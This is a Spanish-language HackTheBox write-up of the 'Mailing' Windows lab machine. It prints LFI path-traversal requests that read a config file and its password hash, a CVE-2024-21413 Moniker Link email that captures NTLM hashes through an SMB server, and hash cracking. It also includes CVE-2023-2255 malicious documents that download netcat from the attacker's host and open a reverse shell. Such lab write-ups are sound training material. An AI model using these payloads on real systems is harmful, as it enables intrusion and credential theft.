@@ -1,0 +1,446 @@
+---
+title: "Máquina Mailing"
+description: "Resolución de la máquina Mailing de HackTheBox"
+tags: ["LFI", "CVE-2024-21413", "CVE-2023-2255"]
+categories: ["HackTheBox", "Easy", "Windows"]
+logo: "/assets/writeups/mailing/logo.webp"
+---
+
+En esta máquina abusaremos del CVE-2024-21413 para obtener acceso inicial al sistema, luego escalaremos privilegios abusando de otro CVE; CVE-2023-2255.
+
+## Reconocimiento
+
+La máquina tiene varios puertos abiertos
+
+```bash
+# Nmap 7.94 scan initiated Sat May  4 16:42:49 2024 as: nmap -sS -Pn -n -p- --open -vvv -oN ports --min-rate 100 10.129.57.173
+Nmap scan report for 10.129.57.173
+Host is up, received user-set (0.14s latency).
+Scanned at 2024-05-04 16:42:49 -04 for 596s
+Not shown: 65516 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE      REASON
+25/tcp    open  smtp         syn-ack ttl 127
+80/tcp    open  http         syn-ack ttl 127
+110/tcp   open  pop3         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+143/tcp   open  imap         syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+465/tcp   open  smtps        syn-ack ttl 127
+587/tcp   open  submission   syn-ack ttl 127
+993/tcp   open  imaps        syn-ack ttl 127
+5040/tcp  open  unknown      syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+7680/tcp  open  pando-pub    syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+55026/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat May  4 16:52:45 2024 -- 1 IP address (1 host up) scanned in 596.36 seconds
+```
+
+El sitio web en el puerto 80 nos redirigue a `mailing.htb`, por lo que vamos a agregarlo a nuestro `/etc/hosts`:
+
+```bash
+10.10.11.14 mailing.htb
+```
+{: .file="/etc/hosts" }
+
+Por la web, podemos ver que se trata de un servidor de correo:
+
+![Web](/assets/writeups/mailing/1.png)
+
+Solamente nos muestra el equipo detrás de la creación de este servicio y un enlace a la descarga de un fichero pdf, que es algo que llama poderosamente la atención ya que nos envia a `http://mailing.htb/download.php?file=instructions.pdf`... jugoso.
+
+Vamos a ver que hacemos
+
+## Intrusión
+
+Si empezamos a jugar con el parámetro `file` del `download.php`, podremos ver que es vulnerable a Local File Inclusion:
+
+```bash
+❯ curl -v "http://mailing.htb/download.php?file=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini"
+* Host mailing.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.14
+*   Trying 10.10.11.14:80...
+* Connected to mailing.htb (10.10.11.14) port 80
+> GET /download.php?file=..\..\..\..\..\..\..\..\..\..\Windows\win.ini HTTP/1.1
+> Host: mailing.htb
+> User-Agent: curl/8.8.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Cache-Control: must-revalidate
+< Pragma: public
+< Content-Type: application/octet-stream
+< Expires: 0
+< Server: Microsoft-IIS/10.0
+< X-Powered-By: PHP/8.3.3
+< Content-Description: File Transfer
+< Content-Disposition: attachment; filename="win.ini"
+< X-Powered-By: ASP.NET
+< Date: Thu, 05 Sep 2024 22:37:06 GMT
+< Content-Length: 92
+< 
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+* Connection #0 to host mailing.htb left intact
+```
+
+Okay good, pero el problema aquí es que no tenemos nada interesante de lo que podamos extraer información... por ahora.
+
+Viendo el fichero PDF, podemos notar que muestran como configurar varios clientes de correo para acceder al servidor en cuestión, entre ellos está Windows Mail:
+
+![PDF](/assets/writeups/mailing/2.png)
+
+Buscando sobre vulnerabilidades recientes de este cliente, podemos encontrar cositas
+
+![CVE](/assets/writeups/mailing/3.png)
+
+Sin embargo, este CVE no parece tener algún exploit público. Pero si seguimos buscando en el navegador encontraremos uno que si tiene en GitHub: `CVE-2024-21413`
+
+> The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link. An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.
+> (https://tryhackme.com/r/room/monikerlink)
+
+Vale, esta se ve interesante.
+
+Utilizando este PoC [de GitHub](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability), podemos intentar enviar un correo a alguno de los usuarios que estén registrados en el sistema. Al final del PDF nos muestran una dirección de correo que es `maya@mailing.htb`, y es uno de los nombres que pudimos ver en la landing page del inicio. También podemos ver una credencial que es `user:password` que podemos intentar utilizar, ya que el SMTP está protegido por autenticación.
+
+Sabiendo esto, podemos pensar que la dirección de correo de los otros dos serán `ruy@mailing.htb` y `gregory@mailing.htb`, pero probemos primero esta vulnerabilidad con la de maya.
+
+Pero al intentar enviarle un correo con lo antes mencionado, nos sale que:
+
+```bash
+❯ python CVE-2024-21413.py --server mailing.htb --username 'user@mailing.htb' --password 'password' --subject 'Read this' --sender admin@mailing.htb --recipient maya@mailing.htb --url '\\10.10.14.167\uwu\uwu.rtf'
+
+CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+Alexander Hagenah / @xaitax / ah@primepage.de
+
+❌ Failed to send email: (535, b'Authentication failed. Restarting authentication process.')
+```
+
+Uh, parece que esa credencial no funciona.
+
+Volvamos a la web, si vemos nos dice que tienen hMailServer como servidor de correos
+
+> Using any mail client you can connect to our server with your account with any system (Linux, MacOS or Windows) and you're ready to start mailing! Powered by hMailServer
+
+Viendo la documentación oficial de este servidor de correo sobre como se instala y donde se hayan sus archivos de configuración, podemos saber de un dato bastante útil:
+
+![Config location](/assets/writeups/mailing/4.png)
+
+Podemos intentar obtener el archivo `hMailServer.ini` utilizando el LFI que descubrimos al inicio. Probando por localizaciones encontramos que se haya en `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`
+
+```bash
+❯ curl -v "http://mailing.htb/download.php?file=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Program%20Files%20(x86)\\hMailServer\\Bin\\hMailServer.ini"
+* Host mailing.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.14
+*   Trying 10.10.11.14:80...
+* Connected to mailing.htb (10.10.11.14) port 80
+> GET /download.php?file=..\..\..\..\..\..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Bin\hMailServer.ini HTTP/1.1
+> Host: mailing.htb
+> User-Agent: curl/8.8.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Cache-Control: must-revalidate
+< Pragma: public
+< Content-Type: application/octet-stream
+< Expires: 0
+< Server: Microsoft-IIS/10.0
+< X-Powered-By: PHP/8.3.3
+< Content-Description: File Transfer
+< Content-Disposition: attachment; filename="hMailServer.ini"
+< X-Powered-By: ASP.NET
+< Date: Thu, 05 Sep 2024 23:21:31 GMT
+< Content-Length: 604
+< 
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
+[Database]
+Type=MSSQLCE
+Username=
+Password=0a9f8ad8bf896b501dde74f08efd7e4c
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+* Connection #0 to host mailing.htb left intact
+```
+
+Tenemos el hash de la contraseña del usuario administrador, y es débil:
+
+```bash
+❯ hashcat -m 0 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show
+841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
+```
+
+Utilizando esta contraseña para enviarle al correo a maya funciona:
+
+```bash
+❯ python CVE-2024-21413.py --server 10.10.11.14 --username 'administrator@mailing.htb' --password 'homenetworkingadministrator' --subject 'Read this, is urgent' --sender 'administrator@mailing.htb' --recipient 'maya@mailing.htb' --url '\\<your-ip>\uwu\uwu'
+
+CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+Alexander Hagenah / @xaitax / ah@primepage.de
+
+✅ Email sent successfully.
+```
+
+y en una ventana aparte, donde iniciaremos un servidor SMB utilizando las utilidades que vienen con impacket, recibiremos dentro de unos momentos lo siguiente:
+
+```bash
+❯ smbserver.py -smb2support uwu .
+...
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.14,51821)
+[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
+[*] User MAILING\maya authenticated successfully
+[*] maya::MAILING:aaaaaaaaaaaaaaaa:ced0068bbcf94df21a475c4b89fc23a9:010100000000000080d88d57c600db01c3db1f616a3e3fb500000000010010004b005500640049004e00580069007900030010004b005500640049004e005800690079000200100043005500560054005600660049004a000400100043005500560054005600660049004a000700080080d88d57c600db0106000400020000000800300030000000000000000000000000200000911a248348edd202454d60353e850b59ed75673e3fd280241f2e61814eae66d40a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100360037000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:uwu)
+[*] NetrGetShareInfo Level: 1
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:uwu)
+[*] Closing down connection (10.10.11.14,51821)
+[*] Remaining connections []
+```
+
+¡Es un hash NetNTLMv2! lo que verifica que el cliente de correo que usan es vulnerable a lo que hemos descubierto.
+
+Ahora podemos proceder a intentar crackearlo, y por suerte es débil:
+
+```bash
+MAYA::MAILING:aaaaaaaaaaaaaaaa:ced0068bbcf94df21a475c4b89fc23a9:010100000000000080d88d57c600db01c3db1f616a3e3fb500000000010010004b005500640049004e00580069007900030010004b005500640049004e005800690079000200100043005500560054005600660049004a000400100043005500560054005600660049004a000700080080d88d57c600db0106000400020000000800300030000000000000000000000000200000911a248348edd202454d60353e850b59ed75673e3fd280241f2e61814eae66d40a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100360037000000000000000000:m4y4ngs4ri
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: MAYA::MAILING:aaaaaaaaaaaaaaaa:ced0068bbcf94df21a47...000000
+Time.Started.....: Fri Sep  6 21:38:53 2024 (6 secs)
+Time.Estimated...: Fri Sep  6 21:38:59 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1050.5 kH/s (1.28ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 5933056/14344384 (41.36%)
+Rejected.........: 0/5933056 (0.00%)
+Restore.Point....: 5931008/14344384 (41.35%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: m6159 -> m4941342
+Hardware.Mon.#1..: Temp: 67c Util: 78%
+
+Started: Fri Sep  6 21:38:49 2024
+Stopped: Fri Sep  6 21:39:00 2024
+```
+
+Este usuario existe en el sistema, y también tiene acceso por WinRM:
+
+```bash
+❯ nxc smb mailing.htb -u 'maya' -p 'm4y4ngs4ri'
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
+❯ nxc winrm mailing.htb -u 'maya' -p 'm4y4ngs4ri'
+WINRM       10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
+WINRM       10.10.11.14     5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
+```
+
+Por lo que podemos conectarnos al servidor utilizando WinRM y ver los archivos de este usuario:
+
+
+```bash
+❯ evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri
+                                        
+Evil-WinRM shell v3.6
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maya\Documents>
+```
+
+En el escritorio ya podremos encontrar la primera flag.
+
+```bash
+*Evil-WinRM* PS C:\Users\maya> cd Desktop
+ls -Force
+*Evil-WinRM* PS C:\Users\maya\Desktop> ls -Force
+
+
+    Directory: C:\Users\maya\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         2/28/2024   7:33 PM            282 desktop.ini
+-a----         2/28/2024   7:34 PM           2350 Microsoft Edge.lnk
+-ar---          9/7/2024   3:35 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\maya\Desktop> type user.txt
+3cdb4111eb8de9c59b60de4493******
+```
+
+## Escalada de privilegios
+
+
+En la raíz de la unidad C:\\ podemos encontrar una carpeta curiosa:
+
+```bash
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/10/2024   5:32 PM                Important Documents
+d-----         2/28/2024   8:49 PM                inetpub
+d-----         12/7/2019  10:14 AM                PerfLogs
+d-----          3/9/2024   1:47 PM                PHP
+d-r---         3/13/2024   4:49 PM                Program Files
+d-r---         3/14/2024   3:24 PM                Program Files (x86)
+d-r---          3/3/2024   4:19 PM                Users
+d-----          9/7/2024   3:36 AM                Windows
+d-----         4/12/2024   5:54 AM                wwwroot
+```
+
+Si vemos los programas instalados podemos que está instalado LibreOffice, y entre los archivos podemos ver la versión:
+
+```bash
+*Evil-WinRM* PS C:\Program Files\LibreOffice\readmes> type readme_es.txt
+
+
+======================================================================
+
+Léame de LibreOffice 7.4
+
+======================================================================
+```
+
+Esta versión es vulnerable al CVE-2023-2255, por lo que podemos tomar un [PoC público](https://github.com/elweth-sec/CVE-2023-2255) y explotarlo; primero generemos el documento malicioso:
+
+```bash
+❯ python CVE-2023-2255.py --cmd 'cmd /c curl -o C:\Temp\nc64.exe http://<your-ip>:8000/nc64.exe' --output test.odt
+File test.odt has been created !
+```
+
+Esto nos creará un documento que al abrirlo, abusando de la vulnerabilidad ejecutará el comando `curl` para descargar `nc64.exe` al directorio `C:\Temp` que nosotros habremos creado con anterioridad. Al ponerlo dentro de la carpeta como prosigue; descargándolo de un servidor HTTP creado con `python -m http.server` por nosotros
+
+```bash
+*Evil-WinRM* PS C:\Important Documents> curl -o test.odt http://<your-ip>:8000/test.odt
+*Evil-WinRM* PS C:\Important Documents> dir
+
+
+    Directory: C:\Important Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          9/7/2024   3:59 AM          30553 test.odt
+
+```
+
+Luego de un rato, en el mismo servidor que hemos iniciado anteriormente recibiremos una petición:
+
+```bash
+❯ python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.14 - - [06/Sep/2024 21:59:23] "GET /test.odt HTTP/1.1" 200 -
+10.10.11.14 - - [06/Sep/2024 22:00:25] "GET /nc64.exe HTTP/1.1" 200 -
+```
+
+Lo que es un total indicio de ejecución de comandos. Ahora que tenemos el netcat guardado en el sistema solamente tenemos que generar un documento que lo ejecute y nos mande una consola interactiva a nuestro equipo. (reverse shell)
+
+```bash
+❯ python CVE-2023-2255.py --cmd 'cmd /c C:\Temp\nc64.exe -e cmd.exe <your-ip> 443' --output test.odt
+File test.odt has been created !
+```
+
+Al guardar el documento de nuevo dentro de la misma carpeta, estando en escucha en nuestro equipo recibiremos una consola:
+
+```bash
+# rlwrap es una utilidad para tener cierto control sobre la terminal, como limpiar la pantalla y poder mover el cursor entre carácteres, es útil cuando no puedes crear una tty en Linux o te vas a pasar una consola de Windows, las cuales no son muy flexibles en estas condiciones.
+❯ rlwrap nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.14 51389
+Microsoft Windows [Version 10.0.19045.4355]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Program Files\LibreOffice\program>
+```
+
+y recibimos la consola como un usuario administrador, waos
+
+```bash
+C:\Program Files\LibreOffice\program>whoami
+whoami
+mailing\localadmin
+```
+
+Por lo que ya podemos irnos al escritorio de este usuario y tomar la última flag.
+
+```bash
+C:\Program Files\LibreOffice\program>cd C:\Users\localadmin\Desktop
+cd C:\Users\localadmin\Desktop
+
+C:\Users\localadmin\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9502-BA18
+
+ Directory of C:\Users\localadmin\Desktop
+
+2024-04-12  06:10 AM    <DIR>          .
+2024-04-12  06:10 AM    <DIR>          ..
+2024-02-27  05:30 PM             2,350 Microsoft Edge.lnk
+2024-09-07  03:35 AM                34 root.txt
+               2 File(s)          2,384 bytes
+               2 Dir(s)   4,412,719,104 bytes free
+
+C:\Users\localadmin\Desktop>type root.txt
+type root.txt
+2466d2658305efb892f79f8453******
+```
+
+
+
+
+
+
+
+
+
+
+
